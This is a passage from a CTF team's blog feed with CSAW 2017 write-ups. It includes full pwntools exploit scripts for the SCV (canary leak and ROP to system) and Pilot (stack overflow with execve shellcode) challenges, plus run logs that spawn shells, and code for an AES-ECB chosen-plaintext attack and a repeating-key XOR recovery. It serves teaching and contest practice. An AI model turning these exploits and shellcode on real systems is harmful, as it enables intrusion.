class="line">binary = ELF(<span class="string">'./scv'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</div><div class="line"></div><div class="line">r = getConn()</div><div class="line"><span class="comment"># b *0x00400aae</span></div><div class="line"><span class="comment">#gdb.attach(r, '''</span></div><div class="line"><span class="comment">#b *0x00400cce</span></div><div class="line"><span class="comment">#b *0x00400cd3</span></div><div class="line"><span class="comment">#b *0x00400ddf</span></div><div class="line"><span class="comment">#b *0x00400d94</span></div><div class="line"><span class="comment">#b *0x400d8f</span></div><div class="line"><span class="comment">#b *0x00400dce</span></div><div class="line"><span class="comment">#c''')</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Get a libc address from the stack</span></div><div class="line">LEAKED = readAddressFromTheStack(<span class="number">40</span>, <span class="number">6</span>, <span class="number">-0x8f</span>)</div><div class="line">SYSTEM = LEAKED + <span class="number">0xb0f7</span></div><div class="line">LIBCBASE = SYSTEM -libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH_OFFSET = <span class="number">0x18cd17</span> <span class="comment"># strings -a -t x libc-2.23.so | grep '/bin/sh'</span></div><div class="line">BINSH = LIBCBASE + BINSH_OFFSET</div><div class="line">POPRET = <span class="number">0x0000000000400ea3</span> <span class="comment"># ROPgadget --binary ./scv --only "pop|ret"</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LEAKED LIBC 0x%x"</span> % LEAKED)</div><div class="line">log.info(<span class="string">"SYSTEM LIBC 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"LIBCBASE LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"BINSH ADDRESS 0x%x"</span> % BINSH)</div><div class="line"></div><div class="line">r.recv(<span class="number">1</span>) <span class="comment"># new line</span></div><div class="line"></div><div class="line"><span class="comment"># leak STACK CANARY</span></div><div class="line">STACK_CANARY = readAddressFromTheStack(<span class="number">40</span>+<span class="number">8</span>*<span class="number">16</span>, <span class="number">8</span>, <span class="number">0x0A</span>)</div><div class="line"></div><div class="line">log.info(<span class="string">"STACK CANARY 0x%x"</span> % STACK_CANARY)</div><div class="line"></div><div class="line">ROPCHAIN = <span class="string">''</span></div><div class="line">ROPCHAIN += p64(POPRET)</div><div class="line">ROPCHAIN += p64(BINSH)</div><div class="line">ROPCHAIN += p64(SYSTEM)</div><div class="line"></div><div class="line">padding3 = <span class="string">'A'</span>*(<span class="number">40</span>+<span class="number">8</span>*<span class="number">16</span>)+p64(STACK_CANARY)+ <span class="string">'AAAAAAAA'</span> + ROPCHAIN</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#rewrite old addresses</span></div><div class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">r.sendline(<span class="string">'1'</span>)</div><div class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">r.sendline(padding3)</div><div class="line"></div><div class="line"><span class="comment"># exiting</span></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">r.sendline(<span class="string">'3'</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'[*]BYE ~ TIME TO MINE MIENRALS...'</span>)</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
<p>Running it and get the flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">$ python scv.py</div><div class="line">[*] <span class="string">'~/ctf/csaw/pwn/scv/scv'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[*] <span class="string">'~/ctf/csaw/pwn/scv/libc-2.23.so'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">[+] Opening connection to pwn.chal.csaw.io on port 3764: Done</div><div class="line">-------------------------</div><div class="line">[*]SCV GOOD TO GO,SIR....</div><div class="line">-------------------------</div><div class="line">1.FEED SCV....</div><div class="line">2.REVIEW THE FOOD....</div><div class="line">3.MINE MINERALS....</div><div class="line">-------------------------</div><div class="line">&gt;&gt;</div><div class="line">[*] LEAKED LIBC 0x7fe343297299</div><div class="line">[*] SYSTEM LIBC 0x7fe3432a2390</div><div class="line">[*] LIBCBASE LIBC 0x7fe34325d000</div><div class="line">[*] BINSH ADDRESS 0x7fe3433e9d17</div><div class="line">-------------------------</div><div class="line">[*]SCV GOOD TO GO,SIR....</div><div class="line">-------------------------</div><div class="line">1.FEED SCV....</div><div class="line">2.REVIEW THE FOOD....</div><div class="line">3.MINE MINERALS....</div><div class="line">-------------------------</div><div class="line">&gt;&gt;</div><div class="line">[*] STACK CANARY 0x49b1940e5e5ffe00</div><div class="line">-------------------------</div><div class="line">[*]SCV GOOD TO GO,SIR....</div><div class="line">-------------------------</div><div class="line">1.FEED SCV....</div><div class="line">2.REVIEW THE FOOD....</div><div class="line">3.MINE MINERALS....</div><div class="line">-------------------------</div><div class="line">&gt;&gt;</div><div class="line">[*]BYE ~ TIME TO MINE MIENRALS...</div><div class="line">[*] Switching to interactive mode</div><div class="line"></div><div class="line">$ ls</div><div class="line">flag</div><div class="line">scv</div><div class="line">$ cat flag</div><div class="line">flag&#123;sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;SCV&lt;br&gt;&lt;br&gt;SCV is too hungry to mine the minerals. Can you give him some food?&lt;br&gt;&lt;br&gt;nc pwn.chal.csaw.io 3764&lt;br&gt;&lt;br&gt;&lt;/bloc
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="stackcanary" scheme="https://teamrocketist.github.io/tags/stackcanary/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] CSAW - Pilot</title>
    <link href="https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/"/>
    <id>https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/</id>
    <published>2017-09-18T20:58:25.000Z</published>
    <updated>2017-09-27T12:13:57.347Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>pilot<br><br>Can I take your order?<br><br>nc pwn.chal.csaw.io 8464<br><br>16:05 Eastern: Updated binary<br><br></blockquote>

<p>Simple bufferoverflow , we actually have a read size of <code>0x40</code> stack the binary doesn’t have any kind of protections so it’s a very easy one, just a simple buffer overflow, we even get the buffer address to jump!</p>
<p><img src="https://i.imgur.com/fA4rP6S.png" alt=""></p>
<p>The plan is:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1 - Caculate the offset to overflow.</div><div class="line">2 - Extract the address of the buffer.</div><div class="line">3 - Insert nops at the beginning and then shell code, the rest of the buffer fill it with A or any other values</div><div class="line">4 - Modify the return address with the value of the beginning of the buffer</div></pre></td></tr></table></figure>
<p>Visual representation of the stack!</p>
<p><img src="https://i.imgur.com/sXg37RZ.png" alt=""></p>
<p>How the stack looks like in gdb!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/20g 0x7ffef1913660</div><div class="line">0x7ffef1913660:	0xbf48f63190909090	0xff978cd091969dd1  </div><div class="line">0x7ffef1913670:	0x573b04e6f7dff748	0x41414141050f5f54  </div><div class="line">0x7ffef1913680:	0x4141414141414141	0x00007ffef1913660</div></pre></td></tr></table></figure>
<p>The offset is 40 bytes to overflow the code is very simple</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'pwn/pilot'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'pwn.chal.csaw.io'</span>, <span class="number">8464</span>)</div><div class="line"> </div><div class="line">binary = ELF(<span class="string">'pwn/pilot'</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line">r = getConn()</div><div class="line"><span class="comment">#db.attach(r, '''</span></div><div class="line"><span class="comment">#break *0x0000000000400b35</span></div><div class="line"><span class="comment">#c''')</span></div><div class="line">r.recvuntil(<span class="string">'[*]Good Luck Pilot!....\n'</span>)</div><div class="line"></div><div class="line">nops = <span class="string">'\x90'</span>*<span class="number">4</span></div><div class="line">shellcode =  <span class="string">"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"</span></div><div class="line">padding = <span class="string">'A'</span>* (<span class="number">40</span> - len(nops)- len(shellcode)) </div><div class="line">BUFFER = int(r.recvline()[<span class="number">12</span>:],<span class="number">0</span>)</div><div class="line">log.info(<span class="string">"LEAKED BUFFER 0x%x"</span> % BUFFER)</div><div class="line"></div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'[*]Command:'</span>)</div><div class="line">r.sendline(nops+ shellcode + padding+ p64(BUFFER))</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
<p>Running it</p>
<figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ python pilot.py</div><div class="line">[*] <span class="string">'~/ctf/csaw/pwn/pilot'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">[+] Opening connection to pwn.chal.csaw.io on port 8464: Done</div><div class="line">[*] LEAKED BUFFER 0x7ffc2562d050</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">pilot</div><div class="line">$ cat flag</div><div class="line">flag&#123;1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;pilot&lt;br&gt;&lt;br&gt;Can I take your order?&lt;br&gt;&lt;br&gt;nc pwn.chal.csaw.io 8464&lt;br&gt;&lt;br&gt;16:05 Eastern: Updated binary&lt;br&gt;&lt;br&gt;&lt;/blockquote
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
    
      <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>Crypto-CSAW-CTF-2017-Baby-Crypt</title>
    <link href="https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Baby-Crypt/"/>
    <id>https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Baby-Crypt/</id>
    <published>2017-09-18T17:19:10.000Z</published>
    <updated>2017-09-19T05:11:05.812Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>baby_crypt<br>The cookie is input + flag AES ECB encrypted with the sha256 of the flag as the key.<br><br>nc crypto.chal.csaw.io 1578<br></blockquote>

<p>The first step that we took was to find out how many AES 16 byte blocks that the flag has.<br>To measure this we simply sent an empty request to the service.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">DiogoMonteiro @ ~/baby_crypt -&gt; nc crypto.chal.csaw.io 1578</div><div class="line">Enter your username (no whitespace):</div><div class="line">Your Cookie is: f9cc1330ae5830732a18d1a23211ffbce3725519adb9e6f10d658d87c80825ed</div></pre></td></tr></table></figure>
<p>At this stage, and having a hex string with 64 chars, we know that the flag has 32 bytes (including any padding).<br>Therefore, the flag represents two AES 16 byte blocks.</p>
<p>From the challenge description we know that the encryption is performed using AES ECB, which is vulnerable to chosen plaintext attacks. As a matter of fact, we have control over the first (any) bytes of the plaintext.<br>With a chosen plaintext attack on AES, to find the 32 bytes of the flag, we need to brute force each one of its bytes, resulting in a search space with size 32 x 94 = 3008 chars, which is easy.</p>
<p>The chosen plaintext attack that we performed works as follows. The idea is to input 32 bytes where the last byte is the one that we are going to brute force.</p>
<p>We start by sending to the service the input = AAAAAAAAAAAAAAAX (16 chars) for each char X in the range of printable chars, and store the resulting ciphertext of the second block in a dictionary D1.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(X = byte to brute force, ! = byte of the secret, P = padding byte)</div><div class="line"></div><div class="line">| AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAX | !!!!!!!!!!!!!!!! | !!!!!!!!!!!!!!!! | for each X in 0x20 to 0x7E</div><div class="line">| ---------------input ---------------| --------------secret ---------------|</div><div class="line"></div><div class="line">D1 = &#123;</div><div class="line">	&apos;cipher(AAAAAAAAAAAAAAAa)&apos;: &apos;a&apos;,</div><div class="line">	&apos;cipher(AAAAAAAAAAAAAAAb)&apos;: &apos;b&apos;,</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>To find the first character of the flag, we compute the ciphertext of the second block with input = AAAAAAAAAAAAAAA (15 chars) and lookup for that ciphertext in the dictionary D1.</p>
<p>The next round is similar.<br>For each byte X in the range of printable chars we send input = AAAAAAAAAAAAAAfX (16 chars, and notice the previously found “f” char) to the server and store the resulting ciphertext of the second block in a dictionary D2.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">| AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAfX | !!!!!!!!!!!!!!!! | !!!!!!!!!!!!!!!P |</div><div class="line">| ---------------input ---------------|</div><div class="line"></div><div class="line">D2 = &#123;</div><div class="line">        &apos;cipher(AAAAAAAAAAAAAAfa)&apos;: &apos;a&apos;,</div><div class="line">        &apos;cipher(AAAAAAAAAAAAAAfb)&apos;: &apos;b&apos;,</div><div class="line">        ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Giving input = AAAAAAAAAAAAAAf to the server and looking up in the dictionary D2, we find the second letter of the flag.</p>
<p>And so on.</p>
<p>The following code implements the attack.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">conn = remote(<span class="string">"crypto.chal.csaw.io"</span>, <span class="number">1578</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(chosen)</span>:</span></div><div class="line">        conn.send(chosen + <span class="string">"\n"</span>)</div><div class="line">        <span class="keyword">return</span> conn.recvline().split(<span class="string">" "</span>)[<span class="number">-1</span>].rstrip(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">second_block</span><span class="params">(blocks)</span>:</span></div><div class="line">        <span class="keyword">return</span> blocks[<span class="number">32</span>:<span class="number">64</span>]</div><div class="line"></div><div class="line"></div><div class="line">found = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</div><div class="line">        d = &#123;&#125;</div><div class="line">        b = (<span class="string">"A"</span> * (<span class="number">31</span>-j)) + found</div><div class="line"></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7E</span>):</div><div class="line">                chosen = b + chr(i)</div><div class="line">                blocks = oracle(chosen)</div><div class="line">                d[second_block(blocks)] = chr(i)</div><div class="line">                <span class="keyword">print</span> <span class="string">"."</span>,</div><div class="line"></div><div class="line">        n = oracle(<span class="string">"A"</span> * (<span class="number">31</span>-j))</div><div class="line">        found += d[second_block(n)]</div><div class="line">	<span class="keyword">print</span> found</div><div class="line"></div><div class="line"><span class="keyword">print</span> found</div></pre></td></tr></table></figure>
<p>After running it, we get the flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">..............................................................................................</div><div class="line">f</div><div class="line">..............................................................................................</div><div class="line">fl</div><div class="line">..............................................................................................</div><div class="line">fla</div><div class="line">..............................................................................................</div><div class="line">flag</div><div class="line">..............................................................................................</div><div class="line">flag&#123;</div><div class="line">..............................................................................................</div><div class="line">flag&#123;C</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Cr</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Cry</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Cryp</div><div class="line">..............................................................................................</div><div class="line"></div><div class="line">(truncated output)</div><div class="line"></div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0.</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0..</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0...</div><div class="line">..............................................................................................</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0...&#125;</div><div class="line">flag&#123;Crypt0_is_s0_h@rd_t0_d0...&#125;</div></pre></td></tr></table></figure>
<p>Very fun challenge!</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;baby_crypt&lt;br&gt;The cookie is input + flag AES ECB encrypted with the sha256 of the flag as the key.&lt;br&gt;&lt;br&gt;nc crypto.chal.csa
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="aes" scheme="https://teamrocketist.github.io/tags/aes/"/>
    
      <category term="ecb" scheme="https://teamrocketist.github.io/tags/ecb/"/>
    
  </entry>
  
  <entry>
    <title>[Crypto] CSAW 2017 - Another Xor</title>
    <link href="https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Another-Xor/"/>
    <id>https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Another-Xor/</id>
    <published>2017-09-18T16:46:30.000Z</published>
    <updated>2017-09-19T05:11:05.812Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Another Xor<br>Hey, hey can you find my secret.<br><br><a href="https://ctf.csaw.io/files/ef303796b276cd0bdf4f7c61b2606df5/cipher.py" target="_blank" rel="external">https://ctf.csaw.io/files/ef303796b276cd0bdf4f7c61b2606df5/cipher.py</a><br><a href="https://ctf.csaw.io/files/02a457c28ec0b04e5f7118e54ac8e138/encrypted" target="_blank" rel="external">https://ctf.csaw.io/files/02a457c28ec0b04e5f7118e54ac8e138/encrypted</a><br></blockquote>

<p>Our first attempt to solve this challenge was to use xortool. However, it was a dead end.</p>
<p>By looking at the given code we understand the cipher is just xoring with a repeated key. As a consequence, the second try was to perform a known-plaintext attack on recover a part of the key. We know the first bytes of the plaintext, which are “flag{“.We can xor the first 5 bytes of the ciphertext with “flag{“ to get the first 5 bytes of the key. The result is “A qua”.</p>
<p>The next step is to find the key length. We know that the last 16 bytes are from a hex encoded md5 hash, so our<br>strategy was to try several key lengths while decrypting with the bytes “A qua” that we know. By looking at the partial decrypted values we can find possible key lengths where the resulting chars are printable and the last ones are in hexadecimal.</p>
<p>The code used to find the key length was the following:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">"encrypted"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</div><div class="line">        c = f.read()</div><div class="line"></div><div class="line">key = <span class="string">"A qua"</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">100</span>):</div><div class="line">        keyz = key + (<span class="string">"&lt;"</span> * (j - len(key)))</div><div class="line">        <span class="keyword">print</span></div><div class="line">        cz = <span class="string">""</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"Trying with keysize of "</span> + str(len(keyz))</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</div><div class="line">                <span class="keyword">if</span> keyz[i%len(keyz)] != <span class="string">"&lt;"</span>:</div><div class="line">                        cz += chr(ord(c[i]) ^ ord(keyz[i%len(keyz)]))</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                        <span class="comment"># we still do not have that portion of the key</span></div><div class="line">                        cz += <span class="string">"?"</span></div><div class="line"></div><div class="line">        <span class="keyword">print</span> <span class="string">"plaintext: "</span> + cz[<span class="number">0</span>:len(cz)<span class="number">-32</span>-len(keyz)]</div><div class="line">        <span class="keyword">print</span> <span class="string">"key: "</span> + cz[len(cz)<span class="number">-32</span>-len(keyz): len(cz)<span class="number">-32</span>]</div><div class="line">        <span class="keyword">print</span> <span class="string">"md5: "</span> + cz[len(cz)<span class="number">-32</span>:]</div></pre></td></tr></table></figure>
<p>Key-length 67 was one of the few that the last 16 bytes were hex chars. We noticed this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">trying with keysize of 67</div><div class="line">plaintext: flag&#123;?????????????????????????????????</div><div class="line">key: ????????????????????????????? zinc?????????????????????????????????</div><div class="line">md5: ?????????????????????????????df2</div></pre></td></tr></table></figure>
<p>Lets try with key-length 67.<br>As the ciphertext contains the encryption of the key, it is possible to iteratively find more bytes of the key.<br>This is what implemented to find the flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">"encrypted"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</div><div class="line">        c = f.read()</div><div class="line"></div><div class="line">keyz = <span class="string">"A qua??????????????????????????????????????????????????????????????"</span></div><div class="line"><span class="keyword">print</span> <span class="string">"trying with key of length %d"</span> % len(keyz)</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="string">"?"</span> <span class="keyword">in</span> keyz:</div><div class="line">        cz = <span class="string">""</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</div><div class="line">                <span class="keyword">if</span> keyz[i%len(keyz)] != <span class="string">"?"</span>:</div><div class="line">                        cz += chr(ord(c[i]) ^ ord(keyz[i%len(keyz)]))</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                        cz += <span class="string">"?"</span></div><div class="line"></div><div class="line">        <span class="keyword">print</span> <span class="string">"Partial key --&gt; "</span> + keyz</div><div class="line"></div><div class="line">        ak = cz[len(cz)<span class="number">-32</span>-len(keyz): len(cz)<span class="number">-32</span>]</div><div class="line">        keyz = <span class="string">"A qua"</span> + ak[<span class="number">5</span>:]  <span class="comment"># the first 5 bytes we already know</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"plaintext: "</span> + cz[<span class="number">0</span>:len(cz)<span class="number">-32</span>-len(keyz)]</div><div class="line"><span class="keyword">print</span> keyz</div></pre></td></tr></table></figure>
<p>With this, we got the flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">trying with key of length 67</div><div class="line">Partial key --&gt; A qua??????????????????????????????????????????????????????????????</div><div class="line">Partial key --&gt; A qua???????????????????????? zinc?????????????????????????????????</div><div class="line">Partial key --&gt; A qua???????????????????????? zinc????????????????????????ht pa????</div><div class="line">Partial key --&gt; A qua???????????????ixed ???? zinc????????????????????????ht pa????</div><div class="line">Partial key --&gt; A qua???????????????ixed ???? zinc???????????????very ????ht pa????</div><div class="line">Partial key --&gt; A qua?????? of o????ixed ???? zinc???????????????very ????ht pa????</div><div class="line">Partial key --&gt; A qua?????? of o????ixed ???? zinc?????? make????very ????ht pa????</div><div class="line">Partial key --&gt; A quart???? of o????ixed ???? zinc?????? make????very ????ht pa????</div><div class="line">Partial key --&gt; A quart???? of o????ixed ???? zinc o???? make????very ????ht pa????</div><div class="line">Partial key --&gt; A quart???? of o????ixed ???? zinc o???? 